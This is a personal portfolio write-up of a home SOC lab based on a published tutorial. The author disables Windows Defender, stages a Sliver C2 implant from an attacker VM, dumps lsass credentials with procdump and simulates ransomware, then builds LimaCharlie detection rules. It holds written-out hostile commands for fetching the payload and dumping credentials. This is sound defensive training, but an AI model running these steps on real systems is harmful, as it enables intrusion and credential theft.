**Adam Kruppenbacher - SoC Analyst Virtual Lab – Portfolio Project**

**Project Name:** So You Want to Be a SOC Analyst by Eric Capuano
[Link to original project](https://blog.ecapuano.com/p/so-you-want-to-be-a-soc-analyst-intro)

**Summary:** This project is to showcase my capability to do what a SOC analyst may do in a typical workday. I will start by saying that this project is working from Eric Capuano’s “So You Want To Be a SOC Analyst” blog, which is recommended by Gerald Auger, PhD; I am documenting my own experience and ensuring that I thoroughly understand each concept in this project.

You may find some notes about parts of the project I find fascinating, funny, or something I want to really stick in my head. Sorry if this is distracting, but I find that you have to make learning fun sometimes so you don’t get bored!

To get started, we’re going to need to set up an environment. Here are the steps I took (also documenting any issues I run into along the way, if any).

1. Download and install VMWare Workstation Pro
2. Download [Windows Virtual Machine](https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/)
3. Download [Ubuntu Server 22.04.1 ISO](https://releases.ubuntu.com/22.04.1/ubuntu-22.04.1-live-server-amd64.iso)
4. Unzip the contents of the windows virtual machine .zip file
5. Import Windows machine into VMware by double clicking the WinDev2306Eval file. I named mine “win11” for ease of use.

![](Screenshots/Pasted%20image%2020250116114545.png)

Create an Ubuntu virtual machine using VMware by clicking File > New Virtual Machine and locating the Ubuntu ISO we downloaded earlier.
![](Screenshots/Pasted%20image%2020250116114603.png)
![](Screenshots/Pasted%20image%2020250116114653.png)

![](Screenshots/Pasted%20image%2020250116114709.png)
![](Screenshots/Pasted%20image%2020250116114727.png)
I named this machine “attack” for convenience. I changed disk size to 14gb, and customized it to have 2GB of RAM and 2 CPU cores before launching it.
![](Screenshots/Pasted%20image%2020250116115002.png)
![](Screenshots/Pasted%20image%2020250116115014.png)
![](Screenshots/Pasted%20image%2020250116115035.png)
You can just press OK on the next prompt. After that, press Enter on “Try or install Ubuntu Server”
![](Screenshots/Pasted%20image%2020250116115105.png)
![](Screenshots/Pasted%20image%2020250116115124.png)
![](Screenshots/Pasted%20image%2020250116115131.png)
![](Screenshots/Pasted%20image%2020250116115138.png)
This next part’s gonna take a bit. Your system may become unresponsive. Give it a bit of time and Ubuntu will start as below. When it does start, press enter through the default settings until we get to networking.
![](Screenshots/Pasted%20image%2020250116115211.png)
![](Screenshots/Pasted%20image%2020250116115216.png)
![](Screenshots/Pasted%20image%2020250116115223.png)
![](Screenshots/Pasted%20image%2020250116115230.png)
![](Screenshots/Pasted%20image%2020250116115238.png)
STOP HERE – We have things to do!
![](Screenshots/Pasted%20image%2020250116115256.png)
Go to edit > Virtual Network Editor > Click VMnet8 > NAT Settings > Take a screenshot or write down the info here.
![](Screenshots/Pasted%20image%2020250116115326.png)
![](Screenshots/Pasted%20image%2020250116115333.png)
![](Screenshots/Pasted%20image%2020250116115339.png)
Next, we’re going to manually set IPV4 instead of using automatic DHCP.
![](Screenshots/Pasted%20image%2020250116115404.png)
![](Screenshots/Pasted%20image%2020250116115408.png)
I decided to use Cloudflare nameservers instead of Google, just make sure your nameservers work.
![](Screenshots/Pasted%20image%2020250116115444.png)
![](Screenshots/Pasted%20image%2020250116115516.png)
![](Screenshots/Pasted%20image%2020250116115521.png)
![](Screenshots/Pasted%20image%2020250116115526.png)
![](Screenshots/Pasted%20image%2020250116115532.png)
![](Screenshots/Pasted%20image%2020250116115536.png)
![](Screenshots/Pasted%20image%2020250116115543.png)
![](Screenshots/Pasted%20image%2020250116115549.png)
![](Screenshots/Pasted%20image%2020250116115554.png)
![](Screenshots/Pasted%20image%2020250116115609.png)
My own install said the install was complete, but wouldn’t update. I went ahead and rebooted the virtual machine using the buttons at the top and it resolved the issue. After that, I logged in and pinged google to ensure I had connectivity.
![](Screenshots/Pasted%20image%2020250116115631.png)
Looks good! Let’s start the Windows machine now.
![](Screenshots/Pasted%20image%2020250116115750.png)
Press the green Play button at the top. 

This error kept popping up. Let’s try a command to see if it helps. Make sure to run command prompt in administrator mode before running this command.
![](Screenshots/Pasted%20image%2020250116115825.png)
![](Screenshots/Pasted%20image%2020250116115854.png)
This didn’t work for me, so I tried this instead; you can go to the Virtual Machine’s settings and uncheck the box that says “Virtualize Intel VT-x or AMD-V/RVI”
![](Screenshots/Pasted%20image%2020250116115939.png)
That appeared to do the trick!

After a few minutes, we get a desktop! Yay! Time to disable the security settings. Go to Settings > Privacy and Security > Windows Security > Virus and Threat Protection, then turn Tamper protection off, followed by all other settings in that menu. Then close all the windows we just opened.
![](Screenshots/Pasted%20image%2020250116120023.png)
![](Screenshots/Pasted%20image%2020250116120027.png)
![](Screenshots/Pasted%20image%2020250116120034.png)
![](Screenshots/Pasted%20image%2020250116120040.png)
![](Screenshots/Pasted%20image%2020250116120046.png)
![](Screenshots/Pasted%20image%2020250116120052.png)
![](Screenshots/Pasted%20image%2020250116120058.png)
![](Screenshots/Pasted%20image%2020250116120103.png)
![](Screenshots/Pasted%20image%2020250116120108.png)
![](Screenshots/Pasted%20image%2020250116120113.png)

After this, go to the group policy editor, then go to Computer Configuration > Administrative Templates > Windows Components > Microsoft Defender Antivirus and double click “Turn off Microsoft Defender Antivirus. Click Enabled, Apply, and OK. Then, exit the group policy editor.
![](Screenshots/Pasted%20image%2020250116120142.png)
![](Screenshots/Pasted%20image%2020250116120147.png)
![](Screenshots/Pasted%20image%2020250116120151.png)
![](Screenshots/Pasted%20image%2020250116120155.png)
![](Screenshots/Pasted%20image%2020250116120200.png)
![](Screenshots/Pasted%20image%2020250116120204.png)
![](Screenshots/Pasted%20image%2020250116120209.png)
![](Screenshots/Pasted%20image%2020250116120214.png)
![](Screenshots/Pasted%20image%2020250116120219.png)
![](Screenshots/Pasted%20image%2020250116120228.png)
![](Screenshots/Pasted%20image%2020250116120233.png)
![](Screenshots/Pasted%20image%2020250116120238.png)

Do exactly above with the “Start” value for each of the following:

1. Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Sense
    
2. Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdBoot
    
3. Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinDefend
    
4. Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdNisDrv
    
5. Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdNisSvc
    
6. Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdFilter
    

Go to Start>msconfig>Boot and exit safe boot mode

It’s optional to install Sysmon, and I love options! Let’s install Sysmon. Open an Administrator Powershell session.
![](Screenshots/Pasted%20image%2020250116120309.png)
![](Screenshots/Pasted%20image%2020250116120313.png)
![](Screenshots/Pasted%20image%2020250116120318.png)

Download Sysmon, SwiftonSecurity’s Sysmon Configuration, and install Sysmon with Swift’s config.

```Invoke-WebRequest -Uri https://download.sysinternals.com/files/Sysmon.zip -OutFile C:\Windows\Temp\Sysmon.zip

Expand-Archive -LiteralPath C:\Windows\Temp\Sysmon.zip -DestinationPath C:\Windows\Temp\Sysmon

Invoke-WebRequest -Uri https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml -OutFile 

C:\Windows\Temp\Sysmon\sysmonconfig.xml
C:\Windows\Temp\Sysmon\Sysmon64.exe -accepteula -i C:\Windows\Temp\Sysmon\sysmonconfig.xml
```
![](Screenshots/Pasted%20image%2020250116120447.png)
![](Screenshots/Pasted%20image%2020250116120452.png)

Check to make sure Sysmon started, and check to make sure Event Logs are being created

```
Get-Service sysmon64

Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10
``` 

After this, we need to install LimaCharlie. Let’s first go to [https://app.limacharlie.io/orgs](https://app.limacharlie.io/orgs) and sign up. Luckily they offer free support for up to 2 devices so we can do this project for free!

Once we get in, add a new organization.
![](Screenshots/Pasted%20image%2020250116120543.png)
Make sure to turn off “Demo Configuration” and select “Extended Detection and Response Standard"
![](Screenshots/Pasted%20image%2020250116120558.png)
Create a new key when prompted and name it something to reference what it is.
![](Screenshots/Pasted%20image%2020250116120631.png)
![](Screenshots/Pasted%20image%2020250116120635.png)
![](Screenshots/Pasted%20image%2020250116120640.png)
![](Screenshots/Pasted%20image%2020250116120645.png)
![](Screenshots/Pasted%20image%2020250116120653.png)
![](Screenshots/Pasted%20image%2020250116120702.png)
![](Screenshots/Pasted%20image%2020250116120710.png)
![](Screenshots/Pasted%20image%2020250116120730.png)
After all this, let’s snapshot Windows!

![](Screenshots/Pasted%20image%2020250116120746.png)
Next, it’s time to ready the attack machine:

I couldn’t copy paste directly into the machine from vmware, so to make it easier, we can copy-paste commands into it after connecting from our host using a tool like PuTTY.

![](Screenshots/Pasted%20image%2020250116120833.png)
![](Screenshots/Pasted%20image%2020250116120845.png)
First, go into root user mode by typing

`sudo su`

and enter the password.

Next, let’s copy-paste the following commands:

```
wget https://github.com/BishopFox/sliver/releases/download/v1.5.34/sliver-server_linux -O /usr/local/bin/sliver-server

chmod +x /usr/local/bin/sliver-server

apt install -y mingw-w64
```

Then, make and enter a working directory:
```
mkdir -p /opt/sliver

cd /opt/sliver
```

Launch sliver on the attack machine:
`sliver-server`

![](Screenshots/Pasted%20image%2020250116121007.png)
Rad.
![](Screenshots/Pasted%20image%2020250116121022.png)
Let’s generate a C2 payload.
![](Screenshots/Pasted%20image%2020250116121038.png)
![](Screenshots/Pasted%20image%2020250116121055.png)
Exit this, then spin up a webserver using python:
![](Screenshots/Pasted%20image%2020250116121113.png)
Switch to the Windows VM, then launch an Administrative Powershell

Run this command:

`IWR -Uri http://[Linux_VM_IP]/[payload_name].exe -Outfile C:\Users\User\Downloads\[payload_name].exe`
![](Screenshots/Pasted%20image%2020250116121136.png)
Replace the IP and the Payload name in the right areas. Make sure to use the right IP address!

After this, I took a snapshot named Snapshot – Malware Staged

Interestingly, W![](Screenshots/Pasted%20image%2020250116121309.png)indows Defender still detected threats, even after all that!
![](Screenshots/Pasted%20image%2020250116121305.png)
![](Screenshots/Pasted%20image%2020250116121310.png)
![](Screenshots/Pasted%20image%2020250116121316.png)
I kept having issues, it turns out I wasn’t in sudo/root mode. That fixed it!
![](Screenshots/Pasted%20image%2020250116121330.png)
Next, we run the program with the payload. I accidentally exited the powershell and ran it two more times. 
![](Screenshots/Pasted%20image%2020250116121354.png)
Surprise! Now we have 3 connections!
![](Screenshots/Pasted%20image%2020250116121429.png)

I used the first one on the list for simplicity. 
![](Screenshots/Pasted%20image%2020250116121455.png)

Running info, whoami, and getprivs command
![](Screenshots/Pasted%20image%2020250116121507.png)
Running netstat command. It didn’t pick up on limacharlie, rphcp.exe
![](Screenshots/Pasted%20image%2020250116121525.png)
It did pick up Sysmon when I ran ps -T, though
  ![](Screenshots/Pasted%20image%2020250116121537.png)


Back in LimaCharlie, we can go to the sensor and see if we can find the C2 server process.
![](Screenshots/Pasted%20image%2020250116121557.png)
  
![](Screenshots/Pasted%20image%2020250116121616.png)
When we go to processes, an easy way to know this process is not legitimate is that it is not signed. However, this doesn’t mean it’s safe if it is signed. FELLOW_CRAVAT has no checkmark next to it! No process hash, either. I wonder if there’s a way to look for unsigned processes rapidly.
![](Screenshots/Pasted%20image%2020250116121630.png)
![](Screenshots/Pasted%20image%2020250116121707.png)
![](Screenshots/Pasted%20image%2020250116121713.png)
![](Screenshots/Pasted%20image%2020250116121717.png)
![](Screenshots/Pasted%20image%2020250116121721.png)

You can hover over the hash icon to inspect the hash on virustotal
![](Screenshots/Pasted%20image%2020250116121739.png)
![](Screenshots/Pasted%20image%2020250116121746.png)

So the hash itself isn’t seen as particularly malicious, interesting. I am guessing this is because sliver makes a new file every time, so it would be a different hash. An interesting note, nearly everything has been seen by VirusTotal – which would make this file even more suspicious.
![](Screenshots/Pasted%20image%2020250116121802.png)
When I checked in Timeline to find the process, I found it here!

After this, let’s switch back to the Sliver server, and see what we can do.

![](Screenshots/Pasted%20image%2020250116121811.png)

I used the ‘getprivs’ and it timed out, so I had to run the implant again on the computer. Then, after making sure I had debug privileges, I ran the following command to try to 'steal' my credentials:

`procdump -n lsass.exe -s lsass.dmp`
 
After this, I checked to see if the sensor on LimaCharlie was able to see what I did. It had!
![](Screenshots/Pasted%20image%2020250116121847.png)
Time to make a D&R rule and detect my ‘evil’ self…
![](Screenshots/Pasted%20image%2020250116121901.png)
Clicking “Target Event” in the bottom will let you see the logic that made the process.
![](Screenshots/Pasted%20image%2020250116121913.png)
If you click “Test Event” it will test the rule against the event that you based it on. If it works, it will show the above!

![](Screenshots/Pasted%20image%2020250116121950.png)
Now let’s see what happens when we dump the memory again.
![](Screenshots/Pasted%20image%2020250116122004.png)
Bingo! We have detected a threat!

Next, let’s hop into a shell session and pretend we’re performing a ransomware attack. The first thing attackers may do is delete volume shadow copies, to make sure the files can’t just be restored.

![](Screenshots/Pasted%20image%2020250116122020.png)
![](Screenshots/Pasted%20image%2020250116122028.png)

Seems like it’s detected hacktool patterns!
![](Screenshots/Pasted%20image%2020250116122055.png)
This is the event where we tried to delete volume shadow copies earlier, it seems our rules picked up on it.![](Screenshots/Pasted%20image%2020250116122113.png)
Lots of info further down the page to show why the rule exists. Thanks, Florian!

We can then view the event on the timeline:
![](Screenshots/Pasted%20image%2020250116122139.png)
![](Screenshots/Pasted%20image%2020250116122155.png)

And again, click the arrow/box in the top right to create a new rule.
![](Screenshots/Pasted%20image%2020250116122210.png)
Here, we just need to add the response. Please note, in a real world environment, you would likely be testing the rule for detection for a while before implementing a block.
![](Screenshots/Pasted%20image%2020250116122227.png)

This time, after running the process, it just exits the shell when I put in the ‘whoami’ command
![](Screenshots/Pasted%20image%2020250116122245.png)

Next, I downloaded Florian’s Ransomware Simulator:

[https://github.com/NextronSystems/ransomware-simulator](https://github.com/NextronSystems/ransomware-simulator)

I then ran it on an administrative powershell:
![](Screenshots/Pasted%20image%2020250116122310.png)
Oh no! Look at the text document we got! We have been fake ransomware'd.
![](Screenshots/Pasted%20image%2020250116122324.png)
![](Screenshots/Pasted%20image%2020250116122403.png)
Seems like it detected this one!

I will likely be doing more labs with LimaCharlie in the future, but this is good for now. Thanks for following along with me on this project!